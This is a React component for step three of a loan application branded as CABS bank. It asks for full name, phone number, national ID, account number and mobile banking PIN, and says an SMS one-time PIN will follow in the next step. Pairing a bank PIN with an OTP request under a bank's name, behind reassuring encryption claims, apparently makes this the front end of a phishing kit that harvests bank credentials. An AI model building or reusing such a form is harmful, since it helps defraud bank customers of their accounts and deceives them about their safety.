import React, { useState } from 'react';
import { Shield, Lock, Eye, EyeOff, Smartphone, CreditCard, User, FileText, ArrowRight, ArrowLeft, CheckCircle2, AlertCircle } from 'lucide-react';
import { PersonalDetails, LoanDetails } from '../types';

interface Phase3PersonalDetailsProps {
  loanDetails: LoanDetails;
  onProceed: (details: PersonalDetails) => void;
  onBack: () => void;
}

export const Phase3PersonalDetails: React.FC<Phase3PersonalDetailsProps> = ({
  loanDetails,
  onProceed,
  onBack,
}) => {
  const [fullName, setFullName] = useState('Tinashe Moyo');
  const [phoneNumber, setPhoneNumber] = useState('+263 77 412 8934');
  const [idNumber, setIdNumber] = useState('63-2049182-W-23');
  const [accountNumber, setAccountNumber] = useState('1004 8291 03');
  const [pin, setPin] = useState('4821');
  const [showPin, setShowPin] = useState(false);
  const [monthlyIncome, setMonthlyIncome] = useState('2400');
  const [loanPurpose, setLoanPurpose] = useState('Personal Development & Renovation');
  const [isExistingCustomer, setIsExistingCustomer] = useState(true);
  const [errors, setErrors] = useState<Record<string, string>>({});

  const validate = (): boolean => {
    const errs: Record<string, string> = {};
    if (!fullName.trim() || fullName.trim().length < 3) {
      errs.fullName = 'Please enter your full legal name as on ID';
    }
    if (!phoneNumber.trim() || phoneNumber.trim().length < 9) {
      errs.phoneNumber = 'Please enter a valid mobile phone number';
    }
    if (!idNumber.trim() || idNumber.trim().length < 6) {
      errs.idNumber = 'Please enter your National Identity Number';
    }
    if (isExistingCustomer && (!accountNumber.trim() || accountNumber.replace(/\s/g, '').length < 8)) {
      errs.accountNumber = 'Please enter your 10-digit CABS account number';
    }
    if (!pin.trim() || pin.length < 4) {
      errs.pin = 'Mobile banking PIN must be 4 to 6 digits';
    }
    if (!monthlyIncome || Number(monthlyIncome) <= 0) {
      errs.monthlyIncome = 'Please specify your approximate monthly net income';
    }

    setErrors(errs);
    return Object.keys(errs).length === 0;
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (validate()) {
      onProceed({
        fullName: fullName.trim(),
        phoneNumber: phoneNumber.trim(),
        idNumber: idNumber.trim(),
        accountNumber: isExistingCustomer ? accountNumber.trim() : 'NEW-ACCOUNT-PENDING',
        pin: pin.trim(),
        monthlyIncome,
        loanPurpose,
        isExistingCustomer,
      });
    }
  };

  return (
    <section id="phase-3-personal-details" className="w-full max-w-4xl mx-auto px-4 py-6 md:py-10">
      
      {/* Title & Phase Header */}
      <div className="text-center max-w-xl mx-auto mb-8">
        <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-emerald-50 border border-emerald-200 text-[#65B32E] text-xs font-bold uppercase tracking-wider mb-2">
          <Shield className="w-3.5 h-3.5" />
          <span>Phase 3: Applicant Identity & Security</span>
        </div>
        <h2 className="text-2xl sm:text-3xl font-black text-[#0A2960] tracking-tight">
          Applicant Information
        </h2>
        <p className="text-slate-600 text-sm mt-1">
          Provide your CABS mobile banking credentials and personal details to verify your eligibility for <strong>${loanDetails.amount.toLocaleString()}</strong>.
        </p>
      </div>

      {/* Brief Summary Bar of Phase 2 Selection */}
      <div className="bg-slate-100 rounded-2xl p-4 mb-6 border border-slate-200 flex flex-wrap items-center justify-between gap-3 text-xs">
        <div className="flex items-center gap-2">
          <span className="w-2.5 h-2.5 rounded-full bg-[#65B32E]"></span>
          <span className="font-medium text-slate-600">Selected Product:</span>
          <span className="font-bold text-[#0A2960] capitalize">{loanDetails.category} Finance</span>
        </div>
        <div className="flex items-center gap-4">
          <div>
            <span className="text-slate-500">Amount:</span>{' '}
            <strong className="text-[#0A2960] font-mono text-sm">${loanDetails.amount.toLocaleString()}</strong>
          </div>
          <div>
            <span className="text-slate-500">Term:</span>{' '}
            <strong className="text-[#0A2960] font-mono text-sm">{loanDetails.tenureMonths} Months</strong>
          </div>
          <div>
            <span className="text-slate-500">Est. Installment:</span>{' '}
            <strong className="text-[#65B32E] font-mono text-sm">${loanDetails.monthlyInstallment.toFixed(2)}/mo</strong>
          </div>
        </div>
      </div>

      {/* Main Form */}
      <form onSubmit={handleSubmit} className="bg-white rounded-3xl p-6 sm:p-10 border border-slate-200 shadow-sm space-y-6">
        
        {/* Existing vs New Customer selector */}
        <div className="bg-slate-50 p-3 rounded-2xl border border-slate-200 flex items-center justify-between">
          <span className="text-xs font-bold text-slate-700">Do you hold an active CABS Account?</span>
          <div className="flex items-center gap-2">
            <button
              type="button"
              onClick={() => setIsExistingCustomer(true)}
              className={`px-3 py-1 rounded-lg text-xs font-bold transition-all cursor-pointer ${
                isExistingCustomer
                  ? 'bg-[#0A2960] text-white shadow-2xs'
                  : 'text-slate-600 hover:bg-slate-200'
              }`}
            >
              Existing CABS Client
            </button>
            <button
              type="button"
              onClick={() => setIsExistingCustomer(false)}
              className={`px-3 py-1 rounded-lg text-xs font-bold transition-all cursor-pointer ${
                !isExistingCustomer
                  ? 'bg-[#0A2960] text-white shadow-2xs'
                  : 'text-slate-600 hover:bg-slate-200'
              }`}
            >
              New Client
            </button>
          </div>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          
          {/* 1. Full Legal Name */}
          <div className="space-y-1.5">
            <label htmlFor="fullname-input" className="text-xs font-bold text-slate-700 flex items-center gap-1.5">
              <User className="w-3.5 h-3.5 text-[#0A2960]" />
              <span>Full Legal Name</span>
            </label>
            <input
              id="fullname-input"
              type="text"
              value={fullName}
              onChange={(e) => setFullName(e.target.value)}
              placeholder="e.g. Tinashe Moyo"
              className={`w-full px-4 py-2.5 rounded-xl border text-sm font-medium focus:outline-hidden transition-all ${
                errors.fullName
                  ? 'border-red-400 bg-red-50/30 focus:border-red-500'
                  : 'border-slate-200 focus:border-[#65B32E]'
              }`}
            />
            {errors.fullName && (
              <p className="text-[11px] text-red-500 flex items-center gap-1">
                <AlertCircle className="w-3 h-3" /> {errors.fullName}
              </p>
            )}
          </div>

          {/* 2. Mobile Phone Number (for OTP) */}
          <div className="space-y-1.5">
            <label htmlFor="phone-input" className="text-xs font-bold text-slate-700 flex items-center gap-1.5">
              <Smartphone className="w-3.5 h-3.5 text-[#0A2960]" />
              <span>Mobile Phone Number (for SMS OTP)</span>
            </label>
            <input
              id="phone-input"
              type="tel"
              value={phoneNumber}
              onChange={(e) => setPhoneNumber(e.target.value)}
              placeholder="+263 77 123 4567"
              className={`w-full px-4 py-2.5 rounded-xl border text-sm font-mono font-medium focus:outline-hidden transition-all ${
                errors.phoneNumber
                  ? 'border-red-400 bg-red-50/30 focus:border-red-500'
                  : 'border-slate-200 focus:border-[#65B32E]'
              }`}
            />
            <p className="text-[11px] text-slate-400">
              {errors.phoneNumber ? (
                <span className="text-red-500 flex items-center gap-1">
                  <AlertCircle className="w-3 h-3" /> {errors.phoneNumber}
                </span>
              ) : (
                'One-Time Pin (OTP) will be transmitted to this number in Phase 4.'
              )}
            </p>
          </div>

          {/* 3. National Identity Number (ID) */}
          <div className="space-y-1.5">
            <label htmlFor="id-input" className="text-xs font-bold text-slate-700 flex items-center gap-1.5">
              <FileText className="w-3.5 h-3.5 text-[#0A2960]" />
              <span>National ID Number</span>
            </label>
            <input
              id="id-input"
              type="text"
              value={idNumber}
              onChange={(e) => setIdNumber(e.target.value.toUpperCase())}
              placeholder="e.g. 63-1234567-X-12"
              className={`w-full px-4 py-2.5 rounded-xl border text-sm font-mono font-medium focus:outline-hidden uppercase transition-all ${
                errors.idNumber
                  ? 'border-red-400 bg-red-50/30 focus:border-red-500'
                  : 'border-slate-200 focus:border-[#65B32E]'
              }`}
            />
            {errors.idNumber && (
              <p className="text-[11px] text-red-500 flex items-center gap-1">
                <AlertCircle className="w-3 h-3" /> {errors.idNumber}
              </p>
            )}
          </div>

          {/* 4. CABS Account Number */}
          <div className="space-y-1.5">
            <label htmlFor="account-input" className="text-xs font-bold text-slate-700 flex items-center gap-1.5">
              <CreditCard className="w-3.5 h-3.5 text-[#0A2960]" />
              <span>{isExistingCustomer ? 'CABS Account Number' : 'Account Preference'}</span>
            </label>
            {isExistingCustomer ? (
              <input
                id="account-input"
                type="text"
                value={accountNumber}
                onChange={(e) => setAccountNumber(e.target.value)}
                placeholder="1002 4892 01"
                maxLength={14}
                className={`w-full px-4 py-2.5 rounded-xl border text-sm font-mono font-medium focus:outline-hidden transition-all ${
                  errors.accountNumber
                    ? 'border-red-400 bg-red-50/30 focus:border-red-500'
                    : 'border-slate-200 focus:border-[#65B32E]'
                }`}
              />
            ) : (
              <div className="w-full px-4 py-2.5 rounded-xl border border-slate-200 bg-slate-50 text-xs text-slate-600 font-medium">
                New CABS Platinum Account will be provisioned simultaneously upon loan sanction.
              </div>
            )}
            {errors.accountNumber && (
              <p className="text-[11px] text-red-500 flex items-center gap-1">
                <AlertCircle className="w-3 h-3" /> {errors.accountNumber}
              </p>
            )}
          </div>

          {/* 5. Mobile Banking PIN */}
          <div className="space-y-1.5">
            <div className="flex items-center justify-between">
              <label htmlFor="pin-input" className="text-xs font-bold text-slate-700 flex items-center gap-1.5">
                <Lock className="w-3.5 h-3.5 text-[#0A2960]" />
                <span>Mobile Banking PIN</span>
              </label>
              <button
                type="button"
                onClick={() => setShowPin(!showPin)}
                className="text-[11px] text-slate-500 hover:text-[#0A2960] flex items-center gap-1 cursor-pointer"
              >
                {showPin ? <EyeOff className="w-3 h-3" /> : <Eye className="w-3 h-3" />}
                <span>{showPin ? 'Hide' : 'Show'}</span>
              </button>
            </div>
            <div className="relative">
              <input
                id="pin-input"
                type={showPin ? 'text' : 'password'}
                inputMode="numeric"
                pattern="[0-9]*"
                maxLength={6}
                value={pin}
                onChange={(e) => setPin(e.target.value.replace(/\D/g, ''))}
                placeholder="••••"
                className={`w-full px-4 py-2.5 rounded-xl border text-sm font-mono tracking-widest font-bold focus:outline-hidden transition-all ${
                  errors.pin
                    ? 'border-red-400 bg-red-50/30 focus:border-red-500'
                    : 'border-slate-200 focus:border-[#65B32E]'
                }`}
              />
            </div>
            {errors.pin ? (
              <p className="text-[11px] text-red-500 flex items-center gap-1">
                <AlertCircle className="w-3 h-3" /> {errors.pin}
              </p>
            ) : (
              <p className="text-[10px] text-slate-400">
                Authorized 4-digit PIN for CABS USSD / Mobile Banking verification.
              </p>
            )}
          </div>

          {/* 6. Net Monthly Income (USD) */}
          <div className="space-y-1.5">
            <label htmlFor="income-input" className="text-xs font-bold text-slate-700 flex items-center gap-1.5">
              <span>Net Monthly Income (USD)</span>
            </label>
            <div className="relative">
              <span className="absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400 font-bold">$</span>
              <input
                id="income-input"
                type="number"
                value={monthlyIncome}
                onChange={(e) => setMonthlyIncome(e.target.value)}
                placeholder="2000"
                className={`w-full pl-8 pr-4 py-2.5 rounded-xl border text-sm font-mono font-medium focus:outline-hidden transition-all ${
                  errors.monthlyIncome
                    ? 'border-red-400 bg-red-50/30 focus:border-red-500'
                    : 'border-slate-200 focus:border-[#65B32E]'
                }`}
              />
            </div>
            {errors.monthlyIncome && (
              <p className="text-[11px] text-red-500 flex items-center gap-1">
                <AlertCircle className="w-3 h-3" /> {errors.monthlyIncome}
              </p>
            )}
          </div>

        </div>

        {/* Loan Purpose */}
        <div className="space-y-1.5">
          <label htmlFor="purpose-select" className="text-xs font-bold text-slate-700">
            Primary Purpose of Loan
          </label>
          <select
            id="purpose-select"
            value={loanPurpose}
            onChange={(e) => setLoanPurpose(e.target.value)}
            className="w-full px-4 py-2.5 rounded-xl border border-slate-200 text-sm font-medium focus:outline-hidden focus:border-[#65B32E] bg-white cursor-pointer"
          >
            <option value="Personal Development & Renovation">Home Improvement / Renovation</option>
            <option value="Vehicle Purchase or Upgrade">Vehicle Purchase or Repair</option>
            <option value="Business Expansion & Working Capital">Business Working Capital & Inventory</option>
            <option value="Education & School Tuition">School / University Tuition Fees</option>
            <option value="Medical & Family Emergency">Medical / Emergency Health Cover</option>
            <option value="Agricultural Inputs & Equipment">Farming & Agricultural Equipment</option>
          </select>
        </div>

        {/* CABS Security Reassurance Note */}
        <div className="bg-emerald-50/60 border border-emerald-200 rounded-2xl p-4 flex items-start gap-3">
          <Shield className="w-5 h-5 text-[#65B32E] flex-shrink-0 mt-0.5" />
          <div className="text-xs text-slate-700 space-y-1">
            <div className="font-bold text-[#0A2960]">CABS Bank Grade Data Encryption</div>
            <p className="text-slate-600 leading-relaxed">
              Your details and mobile banking PIN are protected by 256-bit SSL encryption. In the next step (Phase 4), a secure OTP will be dispatched to confirm your identity before loan processing.
            </p>
          </div>
        </div>

        {/* Action buttons */}
        <div className="pt-4 border-t border-slate-100 flex flex-col sm:flex-row items-center justify-between gap-4">
          <button
            type="button"
            onClick={onBack}
            className="w-full sm:w-auto px-5 py-3 rounded-xl border border-slate-200 hover:bg-slate-50 text-slate-700 font-bold text-xs sm:text-sm flex items-center justify-center gap-2 cursor-pointer transition-colors"
          >
            <ArrowLeft className="w-4 h-4" />
            <span>Back to Calculator</span>
          </button>

          <button
            id="submit-phase-3-btn"
            type="submit"
            className="w-full sm:w-auto bg-[#65B32E] hover:bg-[#589c28] text-white font-bold py-3.5 px-8 rounded-xl shadow-md hover:shadow-lg transition-all flex items-center justify-center gap-2 cursor-pointer text-sm sm:text-base group"
          >
            <span>Confirm & Request OTP</span>
            <ArrowRight className="w-4 h-4 group-hover:translate-x-1 transition-transform" />
          </button>
        </div>

      </form>

    </section>
  );
};
